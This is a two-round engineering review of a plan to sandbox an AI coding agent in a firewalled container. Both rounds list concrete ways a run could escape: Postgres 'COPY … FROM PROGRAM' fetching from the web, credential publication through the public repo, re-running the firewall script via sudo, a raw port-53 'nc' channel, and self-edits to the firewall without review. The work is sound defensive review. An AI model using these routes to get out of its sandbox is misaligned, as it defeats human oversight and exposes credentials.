# B1.58 review

## Plan review (round 1)

SCOPE: tooling (no §; `scripts/agent/`, `.devcontainer/runner/`). Plan at `cc1c862`. Read: card B1.58, B1.44
plan/review (sandbox deferrals), B1.42 spike, B1.47 plan, `run.sh`, `run-smoke.sh`, `.devcontainer/*`,
`docker-compose.yml`, `compose-smoke.sh`, `scripts/ci/lib.sh`, `tier.sh`, D-19, D-25..D-28.

Probes run (none on the tree, none on the live database):

- `scripts/next-task.sh --check B1.58` → `[next-task] B1.58: no overlap with any Doing or Review card` (exit 0)
- `scripts/agent/tier.sh backlog/work/B1.58/plan.md` → `high`; `plan-files.sh --file` → 11 tokens, all in the table
- `npm view @anthropic-ai/claude-code time`: 2.1.303 published 2026-10-18T21:15Z (15 days), 2.1.309 2026-10-22 (11
  days); 2.1.303 ships the native binary as `optionalDependencies` (`claude-code-linux-arm64` etc.) from the registry
- Throwaway `postgres:17-alpine` (not `level-up-lab-postgres-1`): as `postgres` over TCP,
  `COPY o FROM PROGRAM 'wget -q -T 5 -O - https://example.com; id -un'` returned example.com's HTML and `postgres`
- `docker compose config` on a scratch copy with a stand-in runner overlay: dev overlay and runner overlay both
  resolve `pnpm-store` to `level-up-lab_pnpm-store`; `runner` and `postgres` share network `default`
- `tier.sh` on a scratch plan listing only `.devcontainer/runner/init-firewall.sh` and `Dockerfile` → `low`; both
  paths fail `CONFIG_PROTECTED`
- `gh repo view --json visibility` → `PUBLIC`

| Check                                                                | Result                                                                                                                                                  |
| -------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| every file belongs to the card                                       | pass. 4 new `.devcontainer/runner/*`, `run.sh`, `run-smoke.sh`, new `sandbox-probe.sh`, `scripts/CLAUDE.md`, 3 work files; none owned by B1.55 or B1.49 |
| interfaces follow `ts-style.md`; mutations in actions; Prisma in lib | n/a (no `src/`); bash 3.2 stated for run-smoke. `--mode` signature and S1–S6 pasted                                                                     |
| follows `advice.md` or states the deviation                          | pass. "Advisor skipped (tier quick)". Deviation from the card's named Linux build (`claude-code-vm`) is not stated (reason 6)                           |
| ≤ 7 criteria, measurable Thens                                       | pass. 4 Acceptance clauses, each mapped to S1–S6 or R15. The cost paragraph understates two exposures (reasons 1, 3)                                    |
| verification: exact commands, expected numbers                       | fail, minor: `pnpm lint && pnpm typecheck && pnpm test` "green" has no count (reason 7). The rest has numbers (15, 9, 6/6, 6/6)                         |
| skeleton → red → green → map → review                                | pass for tooling: red `test(scripts)`, green `chore(scripts)`, review `docs(backlog)`; no skeleton or map row without a §, as B1.44                     |
| `Lead approves spec` box                                             | n/a. No spec section (tooling, D-26, D-27). `Plan approved by:` empty; I write neither                                                                  |
| no settled D-n contradicted                                          | pass. D-19 label named, D-28 tier high matches `tier.sh`. D-28 has no row for `.devcontainer/` (reason 4)                                               |
| `next-task.sh --check B1.58`                                         | pass: "B1.58: no overlap with any Doing or Review card"                                                                                                 |

Verdict: changes requested

1. **The allowed Postgres is a way around the firewall** (confirmed). The plan allows "the compose network (Postgres)"
   and sets `DATABASE_URL` to `postgres:5432` with the compose superuser `postgres`/`postgres`. A
   `bypassPermissions` run in `runner` can send `COPY … FROM PROGRAM '<any shell>'` to it. That runs as the OS user
   `postgres` in `level-up-lab-postgres-1`, a container with no firewall. My probe on a throwaway copy fetched
   example.com that way. The same login can drop every worktree schema in the shared `pgdata`. Allowing the
   compose subnet also lets the run reach every other container in project `level-up-lab` (`app`, when the dev
   container is up). None of the card's Acceptance needs a database: `--check-binary` uses only `git worktree add`.
   Fix: give `runner` no database access in B1.58 (no `DATABASE_URL`, no compose-subnet rule) and leave the DB
   question to B1.59, or use a role without superuser and without `pg_execute_server_program`. Either way, add an
   S-probe proving the database route is closed (refused, or `COPY … PROGRAM` denied).
2. **The pnpm store is shared with the unsandboxed dev container** (confirmed via compose config). `pnpm-store`
   without a `runner-` prefix resolves to the same `level-up-lab_pnpm-store` volume that `.devcontainer/` mounts.
   The dev container runs as root and has the docker socket (`docker-outside-of-docker`). Once a run in the sandbox
   can write to that store, the store is a write channel to the next `pnpm install` in that container. The ownership
   also differs (root writes, `node` reads), so the runner's `pnpm install` can hit EACCES. Fix: a separate
   `runner-pnpm-store` volume, and S6 extended so that no volume is shared with `app`.
3. **The stated exfiltration cost understates the exposure** (confirmed: the repo is PUBLIC). The Claude login lives
   in volume `runner-claude`, and the gh token is in the same user's home. Both are readable by a
   `bypassPermissions` run as `node`. Pushing either one to a branch of this repository publishes it. The proposed
   mitigation, "a fine-grained token for this repo only", does not prevent that: pushing branches to this repo is
   exactly what the token is for. The lead must see this before approving. Either state it in Costs (the lead's
   Claude credential and gh token are readable by a run and can be published through this public repo), or reduce it
   in the plan: no push scope until B1.59, or credentials the run cannot read. The second option is likely B1.59's.
4. **Deferring `.devcontainer/` protection opens a window with B1.55** (confirmed). `tier.sh` rates a plan that
   changes only `.devcontainer/runner/init-firewall.sh` or the `Dockerfile` (the sudoers line) as `low`, and
   `check-config-change.sh` asks for no label. After B1.55, a reviewed low-tier `agent-ready` plan passes without
   the lead. So an agent could widen its own firewall with no human in the loop. Fix: add `\.devcontainer/.*` to
   `CONFIG_PROTECTED` in `scripts/ci/lib.sh` here (lib.sh is not in B1.55's set; add a T-probe), or state the window
   and make the follow-up card block B1.55's merge.
5. **The probes do not falsify two of the plan's own claims.** (a) S5 "`iptables -F` refused without sudo" passes
   for any non-root user, including one with `NOPASSWD: ALL`. The claim is "sudo only for firewall", so the probe
   must be `sudo -n iptables -F` and `sudo -n true` refused, with `sudo -n init-firewall.sh` the only allowed entry.
   It must also show the script takes no arguments or environment that change its rules. (b) R15 runs only where
   the marker is absent, so the two `curl` conjuncts of `sandboxed()` are never shown to matter. A mutant that drops
   them survives every probe. Add an in-container probe: with a `curl` that reports example.com reachable, or
   api.github.com unreachable, `run.sh --mode` prints `dontAsk`. If `run.sh` calls curl by absolute path, a PATH
   shim cannot reach it; then say how the negative case is shown. (c) Plausible: the plan names only
   `iptables`/`ipset`. If the compose network ever has IPv6, egress over v6 is unfiltered and S1 tests only v4.
   Set `ip6tables` default DROP, or have S1 assert there is no global v6 route.
6. **Pins and the named build are deviations the plan does not call deviations.** The orchestrator's constraint is
   "versions pinned and at least two weeks old". `node:24-bookworm` is a floating tag, so its age cannot be shown,
   and the 8 apt packages take whatever bookworm serves at build time. Only `claude@2.1.303` is pinned (15 days,
   verified above). Either pin the base by digest (CI keeps its tag, or record why the two may differ) or put "base
   and apt are not pinned" in the lead's decision 2 as a deviation. Separately, the card (via B1.47) names the Linux
   build `claude-code-vm`, the desktop app's aarch64 ELF (B1.42 spike). The plan installs the npm package instead.
   That is a defensible choice (pinned, no host path bound in), but it must be stated as a deviation from the card.
7. **What persists, and what the run can rewrite, is not stated** (plausible). Volumes are `runner-repo`,
   `runner-claude` and `pnpm-store`. `~/.config/gh` and `RUNS` (`~/.level-up-lab/runs`, including
   `verified-versions`) are not on a volume. So every `up --build` loses the gh login and the verified version, which
   means a new paid `--check-binary`, and B1.59's `stopped` marks would not survive. B1.44's review (pass 3, finding 1
   disposition) deferred "keeping `runs/verified-versions` out of a run's reach" to this card. The plan does not
   mention it. In the container, `run.sh`, `verified-versions` and the clone stay writable by the run, so only the
   image (root-owned binary, marker, firewall script, sudoers) is fixed. State that, or move `RUNS` out of the run's
   reach. Also give `pnpm test`'s expected count in Verification.

Not blocking, for the lead: the plan is 73 lines against planning.md's ≈ 40 (B1.44 was longer). `runner`
joins project `level-up-lab`, so a `docker compose up -d --remove-orphans` from the base file alone would delete it,
and a `shutdownAction: stopCompose` in the new `devcontainer.json` would stop the shared Postgres. Settle both in the
diff. The plan's claim that `--disallowedTools` still holds under `bypassPermissions` has no probe. The init check
and `--check-binary` (run under the chosen mode) cover hooks only.

## Plan review (round 2)

SCOPE: tooling (no §; `.devcontainer/runner/`, `scripts/agent/`, `scripts/ci/lib.sh`). Plan at `0f0beac` (77 lines).
Read: cards B1.58 and B1.59, round 1 above, `run.sh`, `run-smoke.sh`, `tier.sh`, `tier-smoke.sh`, `scripts/ci/lib.sh`,
`check-config-change.sh`, `next-task.sh` (claim), `.devcontainer/*`, `docker-compose.yml`, `compose-smoke.sh`,
`worktree.sh` (install step), `package.json`, D-19, D-27, D-28.

Probes run (read-only, nothing on the tree):

- `scripts/next-task.sh --check B1.58` → `[next-task] B1.58: no overlap with any Doing or Review card` (exit 0)
- `scripts/agent/tier.sh backlog/work/B1.58/plan.md` → `high`; `plan-files.sh --file` → 11 tokens, all in the table
- `pnpm test` → `Tests 202 passed (202)` (the plan's number holds); `run-smoke.sh` → `14 probes OK`;
  `tier-smoke.sh` → `9 probes OK`
- `npm view @anthropic-ai/claude-code time`: 2.1.303 2026-10-18 (15 days), 2.1.304 2026-10-19 (14 days)
- `nodejs.org/dist/index.json`: v24.22.0 2026-10-14 `security=false`, **v24.22.1 2026-10-20 `security=true`**,
  v24.22.2 2026-10-27
- Docker Hub `library/node` tags: `24.22.0-bookworm` `tag_last_pushed` **2026-10-21T05:41Z** (12 days);
  `24.22.1-bookworm` re-pushed 2026-10-28
- `worktree.sh:101` runs `pnpm install --frozen-lockfile`; `package.json` builds `@prisma/engines` and `prisma`
  (`onlyBuiltDependencies`), Prisma 6.19.3

Round 1 reasons:

| r1  | Status in round 2                                                                                                                                               |
| --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | addressed. A separate project with no Postgres; S1 refuses `host.docker.internal:5433`, S7 finds no `postgres` host                                             |
| 2   | addressed. `runner-pnpm-store` in project `level-up-lab-runner`, no volume shared with `app`; the orphan and `stopCompose` notes are moot                       |
| 3   | addressed. Costs says the login and the gh token are readable and can be published through the public repo; mitigation is revocation                            |
| 4   | addressed. `\.devcontainer/.*` in `CONFIG_PROTECTED`, T3 probe. D-28 names "the protected list", so this extends it without a new D-n                           |
| 5   | (b) and (c) addressed (S4 curl shim both ways, R15 uname shim; ip6tables DROP, S1 `-6`). (a) half: S5 adds `sudo -n` but not the re-run or arguments (reason 1) |
| 6   | stated as deviations, but the Node pin's facts do not hold (reason 3)                                                                                           |
| 7   | addressed: volumes listed, `pnpm test` 202. The "gains nothing" sentence overstates (reason 5)                                                                  |

| Check                                                                | Result                                                                                                                                      |
| -------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| every file belongs to the card                                       | pass. 4 new `.devcontainer/runner/*`, 4 `scripts/agent/*`, `scripts/ci/lib.sh`, `scripts/CLAUDE.md`, work files; none is B1.55's or B1.49's |
| interfaces follow `ts-style.md`; mutations in actions; Prisma in lib | n/a (no `src/`). `--mode`, S1–S7 and the compose command pasted                                                                             |
| follows `advice.md` or states the deviation                          | pass. "Advisor skipped (tier quick)"; the `claude-code-vm` deviation is stated                                                              |
| ≤ 7 criteria, measurable Thens                                       | pass. 4 Acceptance clauses mapped to S1–S7, R15, T3. Two costs still understated (reasons 4, 5)                                             |
| verification: exact commands, expected numbers                       | pass with a gap. 15/15, 9/9, 202, 6/6, 7/7. `devcontainer.json` is never exercised (reason 6)                                               |
| skeleton → red → green → map → review                                | pass for tooling, as B1.44: red `test(scripts)`, green `chore(scripts)`, review `docs(backlog)`                                             |
| `Lead approves spec` box                                             | n/a (no section). `Plan approved by:` empty; I write neither                                                                                |
| no settled D-n contradicted                                          | pass. D-19 label named, D-28 high matches `tier.sh`                                                                                         |
| `next-task.sh --check B1.58`                                         | pass: "B1.58: no overlap with any Doing or Review card"                                                                                     |

Verdict: changes requested

1. **The firewall script stays runnable by the run, and only its start is probed** (r1 5(a) residue; the gap is
   confirmed in the plan text, the open window is plausible). "sudoers 1 cmd" leaves
   `node NOPASSWD: init-firewall.sh` in place after start, so a `bypassPermissions` run can call it again at any
   time. Trigger: `sudo -n /usr/local/bin/init-firewall.sh & sleep 0.5; curl https://example.com`. A script that
   resets policies to ACCEPT before it flushes and fetches `api.github.com/meta` opens egress for that window. A
   script that keeps DROP fails on the fetch and leaves the container with no allow rules. S5 tests neither case,
   and the round 1 ask that the script take no arguments or environment that change its rules is not in the plan.
   Fix, either: (a) no sudo in the image; the start command runs as root, applies the firewall, then drops to
   `node` with `setpriv`, and the lead and B1.59 enter with `docker exec -u node`. Or (b) a sudoers entry with
   `""` (no arguments), and a first line that refuses a second run before any flush (a root-owned mark in `/run`).
   Either way S5 must add: a second `sudo -n init-firewall.sh` (or "sudo absent") leaves example.com refused and
   api.github.com reachable, checked both during the call and after it.
2. **"DNS stays open" does not name a destination** (plausible). The common pattern, Anthropic's reference script
   included, is `-p udp --dport 53 -j ACCEPT` with no `-d`. That rule is a raw UDP (or TCP) channel to any IP on
   port 53, not only DNS. Trigger: `printf data | nc -u -w1 <any IP> 53` leaves the container. On the compose
   network the resolver is `127.0.0.11`, which is loopback, so no external rule for 53 is needed. Fix: allow 53 only
   to `127.0.0.11`, and add to S1 that `dig @1.1.1.1 example.com` is refused. Then Costs can say exactly what stays
   open: tunnelling through Docker's resolver.
3. **The Node pin skips a security release, and the tag is younger than two weeks** (confirmed). v24.22.1
   (2026-10-20, 13 days old) is flagged `security=true` in nodejs.org's index. The pinned v24.22.0 lacks those
   fixes, and the plan does not say so. The tag `node:24.22.0-bookworm` was last pushed on 2026-10-21, so the bits
   it serves today are 12 days old, not the 19 the plan implies, and Docker re-pushes these tags. Fix: pin by digest
   (`node:24.22.0-bookworm@sha256:…`) with the digest's push date, and put in decision 2, for the lead: "24.22.1 is a
   security release 13 days old; the 14-day rule keeps it out until 2026-11-03". Either take 24.22.1 on that date or
   accept the gap. Also, for the lead: bookworm's `gh` 2.23 is from 2023.
4. **The full issue run is deferred to a card that does not hold it** (the card text is confirmed; the install
   failure is plausible). The plan says Prisma engines and Playwright are "B1.59's". B1.59's Acceptance is a
   launchd plist that runs `run.sh --poll` inside this container. It names no wider allow list and no offline cache.
   Trigger: any `run.sh <issue>` inside → `worktree.sh:101` `pnpm install` → `@prisma/engines`' build fetches from
   `binaries.prisma.sh`, which is refused. So once B1.59 lands, every unattended tick fails at setup. Fix: name the
   card that widens the list or adds the cache (amend B1.59 through the filing lane, or file a new card that B1.59
   depends on), and say in Costs that after B1.58 only `--check-binary` works inside.
5. **Decision 1's costs are not all stated** (plausible). (a) The host and the container each keep their own
   `RUNS` (locks, `stopped` marks) and their own local branches. `next-task.sh --claim` and `in_flight` see the other
   side only after a push or a PR. Until B1.59 the lead can start the same issue on both sides, which gives two
   runs and two `chore/<card>-agent` branches racing to reach origin. (b) "It gains nothing the firewall does not
   still bound" is too strong. The volumes carry a run's writes into every later run: the clone's `.git/hooks` and
   `.git/config` are shared by every later worktree, `verified-versions` is in `runner-runs`, and user-level files
   are in `runner-claude`. So one compromised run can taint the branches of later runs until the volumes are wiped.
   The firewall bounds destinations, not the integrity of later PRs. State both, or recreate `runner-repo` for each
   run.
6. **`devcontainer.json` is in Files but no Verification step uses it** (plausible). The lead's steps use the
   compose `up` command. If the lead opens the runner from VS Code, its server and extension downloads go to hosts
   the allow list refuses (`update.code.visualstudio.com`, `marketplace.visualstudio.com`, `*.vscode-cdn.net`). The
   firewall is already up when VS Code attaches, so the attach can fail. Fix: drop the file (the compose project
   meets the Acceptance), or add an "open in VS Code" step with its expected result and state any host it needs.

Not blocking, for the lead: the plan is 77 lines against planning.md's ≈ 40. The red runs on the host, while the
card says "from the container today"; the host is a stricter red, but say so. Set `CLAUDE_CONFIG_DIR` to the
mounted dir so that `~/.claude.json` persists with the credentials. The `uname` conjunct of `sandboxed()` has no
probe that tells it apart, because the marker already fails on the host; that is redundancy, not a gap.
`--disallowedTools` under `bypassPermissions` stays [unverified], as the plan says. Per the reviewer's rules, a
third round goes to "Waiting on human": each reason above is a stated cost or a one-line fix that the lead can settle
at the gate.
